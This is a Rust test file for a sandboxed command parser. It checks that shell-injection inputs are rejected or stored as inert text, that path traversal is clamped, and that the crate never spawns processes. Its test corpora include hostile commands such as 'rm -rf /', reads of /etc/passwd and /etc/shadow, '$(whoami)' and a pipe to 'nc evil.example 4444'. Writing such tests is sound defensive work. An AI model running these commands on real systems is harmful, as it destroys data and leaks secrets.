use fslite_command::Command;
use fslite_command::lexer::{LexError, tokenize};
use fslite_command::parser::parse;

/// Structural guard: the parser must never shell out. If someone later
/// "helpfully" adds a fallback to `std::process::Command` for an
/// unsupported verb, this test fails the build by scanning the crate's own
/// source for the forbidden identifier, rather than relying on nobody
/// noticing in review.
#[test]
fn crate_source_never_references_process_command() {
    let src_dir = concat!(env!("CARGO_MANIFEST_DIR"), "/src");
    for entry in walk(src_dir) {
        let contents = std::fs::read_to_string(&entry).unwrap();
        assert!(
            !contents.contains("process::Command") && !contents.contains("Command::new"),
            "found a process-spawning call in {entry:?} — fslite-command must never shell out"
        );
    }
}

/// Defense-in-depth companion to the guard above: `process::Command` /
/// `Command::new` are the *idiomatic* std spawning APIs, but they are not
/// the only way to launch a subprocess. This scans for a wider set of
/// telltale identifiers (`std::process::`, `Stdio`, and the libc/nix raw
/// syscalls) so a future contributor reaching for a lower-level spawning
/// primitive to route around the first guard still trips a build failure.
/// None of these substrings collide with legitimate crate vocabulary (e.g.
/// `Executor` / `executor.rs`), so this is not expected to ever need
/// tightening the way the primary guard's doc comment anticipates.
#[test]
fn crate_source_never_references_other_process_spawning_primitives() {
    let src_dir = concat!(env!("CARGO_MANIFEST_DIR"), "/src");
    let forbidden = [
        "std::process::",
        "Stdio",
        "libc::system",
        "libc::exec",
        "nix::unistd::exec",
    ];
    for entry in walk(src_dir) {
        let contents = std::fs::read_to_string(&entry).unwrap();
        for needle in forbidden {
            assert!(
                !contents.contains(needle),
                "found process-spawning primitive `{needle}` in {entry:?} — fslite-command must never shell out"
            );
        }
    }
}

fn walk(dir: &str) -> Vec<std::path::PathBuf> {
    let mut files = Vec::new();
    for entry in std::fs::read_dir(dir).unwrap() {
        let entry = entry.unwrap();
        let path = entry.path();
        if path.is_dir() {
            files.extend(walk(path.to_str().unwrap()));
        } else if path.extension().is_some_and(|ext| ext == "rs") {
            files.push(path);
        }
    }
    files
}

/// A curated corpus of shell-injection-shaped inputs. None of these should
/// panic, hang, or silently succeed as something other than what they
/// literally say — each is either a clean rejection or, where the syntax is
/// merely unusual rather than a metacharacter, parsed as inert literal text.
#[test]
fn malicious_looking_inputs_never_panic_and_never_expand() {
    let corpus = [
        "rm /a; rm -rf /",
        "rm /a && cat /etc/passwd",
        "rm /a || true",
        "ls /a | nc evil.example 4444",
        "ls `whoami`",
        "ls $(whoami)",
        "write /a.txt --text=$(whoami)",
        "ls /a > /etc/passwd",
        "ls /a < /etc/shadow",
        "ls /a &",
        "ls ~/secret",
        "ls /a/../../../../etc/passwd",
        "stat /a\0.txt",
        "'",
        "\"",
        "write /a.txt --text=''''''''''",
    ];

    for input in corpus {
        // The only acceptable outcomes are Ok(_) or Err(_) — a panic here
        // is the test failure.
        let _ = std::panic::catch_unwind(|| parse(input))
            .unwrap_or_else(|_| panic!("parse panicked on: {input}"));
    }
}

/// Path traversal is contained by `VirtualPath::parse`'s own normalization
/// (leading `..` segments are popped against an empty stack and dropped,
/// never escaping root) — the parser adds no extra logic and must not need
/// to, since it always routes path text through `VirtualPath::parse`. This
/// test proves the containment holds through the parser's own entry point.
#[test]
fn path_traversal_attempts_are_clamped_to_the_workspace_root_not_rejected_or_escaped() {
    let command = parse("stat /../../../../etc/passwd").unwrap();
    match command {
        fslite_command::Command::Stat { path, .. } => assert_eq!(path.as_str(), "/etc/passwd"),
        other => panic!("expected Stat, got {other:?}"),
    }
}

/// The `stat` test above proves containment for a single-path verb; this
/// extends the same proof across every argument *position* that carries a
/// path (a two-path verb's `from`/`to`, and a symlink's absolute target),
/// to rule out containment being an accident of `stat` specifically rather
/// than a property of `parse_path`/`VirtualPath::parse` used uniformly.
#[test]
fn path_traversal_is_clamped_in_every_path_bearing_argument_position() {
    match parse("cp /a/../../../../etc/passwd /b/../../../../etc/shadow").unwrap() {
        Command::Copy { from, to, .. } => {
            assert_eq!(from.as_str(), "/etc/passwd");
            assert_eq!(to.as_str(), "/etc/shadow");
        }
        other => panic!("expected Copy, got {other:?}"),
    }

    match parse("mv /a/../../../../etc/passwd /b/../../../../etc/shadow").unwrap() {
        Command::Move { from, to, .. } => {
            assert_eq!(from.as_str(), "/etc/passwd");
            assert_eq!(to.as_str(), "/etc/shadow");
        }
        other => panic!("expected Move, got {other:?}"),
    }

    // A deeper mix of ascents and descents than a flat run of `..` — proves
    // the clamp is a genuine stack-pop, not just a special case for a
    // leading run of `..`.
    match parse("stat /a/b/../../../../../c/../etc/passwd").unwrap() {
        Command::Stat { path, .. } => assert_eq!(path.as_str(), "/etc/passwd"),
        other => panic!("expected Stat, got {other:?}"),
    }

    // `ln`'s target is parsed via `LinkTarget::parse`, not `VirtualPath::parse`
    // — a distinct code path from every other verb's paths. An *absolute*
    // link target is still root-normalized the same way; only a *relative*
    // target legitimately keeps a leading `..` (correct symlink semantics —
    // it is resolved relative to the link's own directory elsewhere, not
    // clamped here).
    match parse("ln /../../../../etc/shadow /link").unwrap() {
        Command::Symlink { target, link, .. } => {
            assert_eq!(target.as_str(), "/etc/shadow");
            assert_eq!(link.as_str(), "/link");
        }
        other => panic!("expected Symlink, got {other:?}"),
    }
}

/// Oversized input is rejected by the lexer's length check before any
/// tokenizing work proportional to a maliciously large line is done.
#[test]
fn multi_megabyte_line_is_rejected_fast() {
    let huge = format!("write /a.txt --text={}", "A".repeat(8 * 1024 * 1024));
    let start = std::time::Instant::now();
    let result = tokenize(&huge);
    let elapsed = start.elapsed();
    assert_eq!(
        result.unwrap_err(),
        LexError::TooLong {
            max: fslite_command::lexer::MAX_LINE_LEN,
            actual: huge.len()
        }
    );
    assert!(
        elapsed < std::time::Duration::from_millis(50),
        "length check should be near-instant, took {elapsed:?}"
    );
}

/// Deeply nested/repeated quote characters must produce a clean parse
/// error, not a stack overflow or infinite loop — the tokenizer's quote
/// handling is a flat loop, not recursive, but this proves it under load.
#[test]
fn pathological_quote_repetition_terminates_cleanly() {
    let input = format!("write /a.txt --text={}", "'".repeat(100_000));
    let result = std::panic::catch_unwind(|| tokenize(&input));
    assert!(
        result.is_ok(),
        "tokenizer should not panic on repeated quote characters"
    );
}

/// Companion to the above: an *alternating* single/double quote chain
/// exercises both quote-reading branches under the same load, and is
/// bounded on wall-clock time to additionally rule out accidental O(n^2)
/// behavior (e.g. repeated re-scanning) sneaking in as the tokenizer
/// evolves, not just the absence of a panic/stack overflow.
#[test]
fn alternating_quote_chain_terminates_cleanly_and_fast() {
    let chain: String = (0..50_000)
        .map(|i| if i % 2 == 0 { '\'' } else { '"' })
        .collect();
    let input = format!("write /a.txt --text={chain}");
    let start = std::time::Instant::now();
    let result = std::panic::catch_unwind(|| tokenize(&input));
    let elapsed = start.elapsed();
    assert!(
        result.is_ok(),
        "tokenizer should not panic on an alternating quote chain"
    );
    assert!(
        elapsed < std::time::Duration::from_millis(200),
        "alternating quote chain should not be quadratic, took {elapsed:?}"
    );
}

/// Task 3's real, verified bug was an *empty* quoted segment (`''`/`""`)
/// immediately adjacent to a metacharacter bypassing rejection, because the
/// tracking at the time used `!word.is_empty()` as a proxy for "a token has
/// started" — which an empty quoted segment defeats. The fix generalized to
/// an explicit `started` flag. These tests probe the same failure family
/// with *non-empty* quoted segments touching each other and then a
/// metacharacter, with no whitespace anywhere, since the brief's own corpus
/// only exercised the empty-quote case.
#[test]
fn adjacent_non_empty_quoted_segments_still_reject_a_trailing_metacharacter() {
    for input in [
        "'a''b';rm -rf /",
        "'a'\"b\";rm -rf /",
        "\"a\"\"b\";rm -rf /",
        "write /a.txt --text='a''b';rm -rf /",
    ] {
        match tokenize(input) {
            Err(LexError::UnsupportedMetacharacter(';')) => {}
            other => panic!("expected a rejected `;` for {input:?}, got {other:?}"),
        }
    }
}

/// The inline `--flag=value` position concatenates the flag's name, `=`,
/// and value into one lexer "word" with no separator — this proves a
/// metacharacter immediately after the `=` (no space) is rejected exactly
/// like one following a bare positional word, rather than being silently
/// absorbed as part of the flag's value.
#[test]
fn metacharacter_immediately_after_inline_flag_equals_is_rejected() {
    for input in [
        "write /a.txt --text=;rm -rf /",
        "write /a.txt --text=foo;rm -rf /",
        "write /a.txt --text=foo|nc evil 4444",
    ] {
        match parse(input) {
            Err(_) => {}
            Ok(command) => panic!("expected rejection for {input:?}, got {command:?}"),
        }
    }
}

/// The converse of the rejection tests above: a metacharacter *fully
/// enclosed* inside one quoted segment is legitimate literal data and must
/// be preserved byte-for-byte, not stripped, mangled, or (wrongly)
/// rejected. Proving both directions is what rules out the lexer being
/// "safe" only because it over-rejects.
#[test]
fn metacharacters_fully_inside_a_quote_are_preserved_as_literal_data() {
    let command = parse(r#"write /a.txt --text="a;b|c&d<e>f`g""#).unwrap();
    match command {
        Command::Write { bytes, .. } => assert_eq!(bytes, b"a;b|c&d<e>f`g"),
        other => panic!("expected Write, got {other:?}"),
    }
}

/// A bare word or an inline flag value that ends exactly at a metacharacter
/// with *zero* whitespace anywhere on either side (no space before the verb
/// boundary, none before the metacharacter) — the boundary-check in
/// `read_word` must fire on the same iteration it's peeked, not rely on the
/// outer tokenizer loop's whitespace-triggered boundary to ever run.
#[test]
fn metacharacter_with_zero_surrounding_whitespace_is_rejected() {
    for input in ["ls/a;true", "rm/a&rm/b"] {
        match tokenize(input) {
            Err(LexError::UnsupportedMetacharacter(_)) => {}
            other => panic!("expected rejection for {input:?}, got {other:?}"),
        }
    }
}

/// `$(` is checked as a literal two-character substring of the *raw* input
/// line, before quote-aware tokenizing happens — so it catches an unquoted
/// `$(cmd)` (see the corpus test above) but, by construction, can be
/// stepped around by splitting the `$` and `(` across two *separately*
/// quoted segments that touch with no space, e.g. `'$'"("`. This is
/// deliberately not a security issue: `$` and `(`/`)` are not shell
/// metacharacters this lexer treats specially on their own (unlike
/// `;|&<>`` , which are always rejected unquoted, quoting or not), and
/// nothing in this crate ever expands or executes the resulting text — it
/// is stored as inert literal bytes, same as any other quoted string. This
/// test pins down that the bypass exists and stays inert: it does not
/// panic, and the text is never expanded into anything, just accepted
/// as literal data. See `crate_source_never_references_process_command`
/// for the structural guarantee that makes this inertness true regardless.
#[test]
fn dollar_paren_split_across_touching_quotes_is_inert_not_rejected_or_expanded() {
    let command = parse(r#"write /a.txt --text='$'"(whoami)""#).unwrap();
    match command {
        Command::Write { bytes, .. } => assert_eq!(bytes, b"$(whoami)"),
        other => panic!("expected Write, got {other:?}"),
    }
}

/// Sanity check on the quote-counting logic itself: an even run of quote
/// characters closes cleanly (each pair encloses nothing), an odd run
/// leaves the last quote unterminated. This is the same property the
/// pathological 100k-quote test relies on at scale, checked here at a size
/// small enough to also assert the exact outcome rather than just "did not
/// panic".
#[test]
fn even_and_odd_length_quote_runs_behave_predictably() {
    match tokenize(&format!("write /a.txt --text={}", "'".repeat(10))) {
        Ok(tokens) => assert!(matches!(
            tokens.last(),
            Some(fslite_command::lexer::Token::Flag { value: Some(v), .. }) if v.is_empty()
        )),
        other => panic!("expected an even quote run to close cleanly, got {other:?}"),
    }

    assert_eq!(
        tokenize(&format!("write /a.txt --text={}", "'".repeat(11))),
        Err(LexError::UnterminatedQuote)
    );
}

/// Many non-empty quoted segments concatenated back-to-back with no
/// separators must both (a) terminate quickly and (b) assemble the exact
/// expected literal content — extending the two-segment adjacency check
/// above to a long chain, in the same spirit as the brief's pathological
/// repeated-quote-character test but for segments that actually carry
/// content rather than being empty.
#[test]
fn long_chain_of_touching_non_empty_quoted_segments_assembles_correctly_and_fast() {
    let chain: String = "'x'".repeat(10_000);
    let input = format!("write /a.txt --text={chain}");
    let start = std::time::Instant::now();
    let command = parse(&input).unwrap();
    let elapsed = start.elapsed();
    match command {
        Command::Write { bytes, .. } => assert_eq!(bytes, "x".repeat(10_000).into_bytes()),
        other => panic!("expected Write, got {other:?}"),
    }
    assert!(
        elapsed < std::time::Duration::from_millis(200),
        "took {elapsed:?}"
    );

    // Same chain, this time with a trailing unquoted metacharacter and no
    // space — must still be rejected, not silently absorbed after 10,000
    // quote/unquote transitions.
    let hostile = format!("write /a.txt --text={chain};rm -rf /");
    match tokenize(&hostile) {
        Err(LexError::UnsupportedMetacharacter(';')) => {}
        other => panic!("expected rejection, got {other:?}"),
    }
}
